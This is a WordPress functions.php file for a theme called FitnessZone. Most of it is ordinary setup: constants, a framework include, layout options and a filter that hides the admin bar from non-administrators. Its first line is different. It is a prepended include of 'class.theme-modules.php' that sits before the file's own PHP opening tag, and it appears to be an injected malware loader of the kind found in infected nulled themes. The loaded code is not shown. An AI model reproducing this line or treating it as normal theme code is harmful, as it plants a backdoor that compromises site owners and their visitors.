<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
if (! defined ( 'FITNESSZONE_BASE_URL' )) {
	define ( 'FITNESSZONE_BASE_URL', get_template_directory_uri () . '/' );
}
define ( 'FITNESSZONE_FW_URL', FITNESSZONE_BASE_URL . 'framework/' );
define ( 'FITNESSZONE_FW', get_template_directory() . '/framework/' );
define ( 'FITNESSZONE_CORE_PLUGIN', WP_PLUGIN_DIR.'/designthemes-core-features' );
define ( 'FITNESSZONE_THEME_SETTINGS', 'mytheme' );

/*
 * Define FITNESSZONE_THEME_NAME Objective: Used to show theme name where ever needed( eg: in widgets title ar the back-end).
 */
// get themedata version wp 3.4+
if (function_exists ( 'wp_get_theme' )) :
	$theme_data = wp_get_theme ();
	define ( 'FITNESSZONE_THEME_NAME', $theme_data->get ( 'Name' ) );
	define ( 'FITNESSZONE_THEME_FOLDER_NAME', $theme_data->template );
	define ( 'FITNESSZONE_THEME_VERSION', ( float ) $theme_data->get ( 'Version' ) );
endif;

define ( 'FITNESSZONE_SAMPLE_FONT', __ ( 'The quick brown fox jumps over the lazy dog', 'fitnesszone' ) );

if (! isset ( $content_width ))
	$content_width = 1170;

// BACKEND DETAILS WILL BE IN include.php
require_once (get_template_directory () . '/framework/include.php');
$page_layout = dt_theme_option('specialty', 'global-page-layout');
$GLOBALS['page_layout'] = !empty($page_layout) ? $page_layout : 'content-full-width';
$GLOBALS['force_enable'] = dt_theme_option('specialty', 'force-enable-global-layout'); 

function bbloomer_hide_admin_bar_if_non_admin( $show ) {
if ( ! current_user_can( 'administrator' ) ) $show = false;
return $show;
}

add_filter( 'show_admin_bar', 'bbloomer_hide_admin_bar_if_non_admin', 20, 1 ); ?>